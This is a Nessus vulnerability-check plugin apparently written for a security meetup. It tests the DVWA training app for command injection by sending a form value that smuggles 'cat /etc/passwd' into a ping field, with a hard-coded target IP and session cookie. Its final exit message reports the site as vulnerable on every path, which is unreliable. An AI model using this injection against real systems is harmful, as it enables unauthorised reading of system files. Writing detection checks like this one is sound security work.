include("compat.inc");

if(description) {
 script_id(200000);
 script_version ("$Revision: 0.1 $");
 script_name(english: "Custom plugin for BSM");
 script_set_attribute(attribute:"synopsis", value:"Custom plugin created for the Boston Security Meetup.");
 script_set_attribute(attribute:"plugin_publication_date", value:"2019/06/20");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_summary(english: "Custom plugin for BSM");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) BSM");
 script_family(english: "General");
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
host = get_host_name();

soc = http_open_socket(port);
if (! soc) exit(0);

request4 = 'POST /DVWA/vulnerabilities/exec/ HTTP/1.1\r\nHost: 159.203.163.198\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nCookie: security=low; PHPSESSID=b7q2du5oeogp1ck7uo3p338f46\r\nContent-Length: 47\r\n\r\nip=8.8.8.8%3B+cat+%2Fetc%2Fpasswd&Submit=Submit';


send(socket:soc, data: request4);

r = http_recv(socket: soc);
http_close_socket(soc);

result = "This site is not vulnerable.";
if(eregmatch(pattern:'messagebus', string:r)) {
 result = 'This site is vulnerable to remote code execution. \n\n'+r;
 security_hole(port: port, extra: result);
}

exit(0,"The site is vulnerable to RCE. \n");
